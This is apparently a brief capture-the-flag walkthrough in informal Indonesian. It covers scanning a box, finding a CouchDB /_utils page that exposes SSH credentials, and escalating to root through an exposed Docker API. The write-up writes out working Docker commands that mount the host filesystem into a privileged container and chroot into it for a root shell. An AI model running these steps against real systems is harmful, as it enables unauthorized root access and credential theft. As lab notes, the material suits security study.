# boot:
1. scan nmap ada ssh ama couch db aja
2. di fuzz pake gobuster bermasalah pake ffuf aja -> cuman dapet beberapa
3. cari gugel aja misal What is the path to list all databases in the web browser of the database management system?
4. ganti akhiran jadi of the couch db -> nanti nemu path nya /_utils /_alldb atau apa gitu
5. ke utils secret nanti nemu creds dah -> ssh aja pake itu


# pe: 
1. ini vuln nya -> https://www.exploit-db.com/exploits/42356 ikutin aja command nya
2. docker -H tcp://<ip>:<port> run --rm -ti -v /:/mnt alpine chroot /mnt /bin/sh
3. atau kalau mau jadi root aja tanpa bisa pindah pindah kayak yg di bash history
4. docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine ->  dah jadi root
5. klaim root  -> pake step 2 aja
